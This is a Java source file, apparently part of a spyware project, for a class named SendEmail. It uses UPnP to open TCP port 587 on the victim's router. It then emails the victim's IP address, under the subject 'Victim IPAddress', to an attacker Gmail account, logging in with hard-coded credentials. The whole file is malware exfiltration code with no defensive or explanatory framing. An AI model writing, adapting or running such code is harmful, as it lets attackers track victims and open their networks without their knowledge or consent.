package Backend;

import com.dosse.upnp.UPnP;

import javax.mail.Message;
import javax.mail.MessagingException;
import javax.mail.Session;
import javax.mail.Transport;
import javax.mail.internet.InternetAddress;
import javax.mail.internet.MimeMessage;
import java.util.Properties;

class SendEmail {
    private Session mailSession;

    static void initSending(String ipaddr) throws MessagingException {
        SendEmail javaEmail = new SendEmail();
        javaEmail.setMailServerProperties();
        javaEmail.draftEmailMessage(ipaddr);
        javaEmail.sendEmail(ipaddr);
    }

    private void setMailServerProperties() {
        Properties emailProperties = System.getProperties();
        emailProperties.put("mail.smtp.port", "587");
        UPnP.openPortTCP(587);
        emailProperties.put("mail.smtp.auth", "true");
        emailProperties.put("mail.smtp.starttls.enable", "true");
        mailSession = Session.getDefaultInstance(emailProperties, null);
    }

    private MimeMessage draftEmailMessage(String argument) throws MessagingException {
        String[] toEmails = {"spywareincorporated@gmail.com"};
        String emailSubject = "Victim IPAddress";
        MimeMessage emailMessage = new MimeMessage(mailSession);
        for (String toEmail : toEmails) {
            emailMessage.addRecipient(Message.RecipientType.TO, new InternetAddress(toEmail));
        }
        emailMessage.setSubject(emailSubject);
        emailMessage.setText(argument);
        return emailMessage;
    }

    private void sendEmail(String argument) throws MessagingException {
        String fromUser = "spywareincorporated@gmail.com";
        String fromUserEmailPassword = "accessing12codes";
        String emailHost = "smtp.gmail.com";
        Transport transport = mailSession.getTransport("smtp");
        transport.connect(emailHost, fromUser, fromUserEmailPassword);
        MimeMessage emailMessage = draftEmailMessage(argument);
        transport.sendMessage(emailMessage, emailMessage.getAllRecipients());
        transport.close();
        System.out.println("Email sent successfully.");
    }
}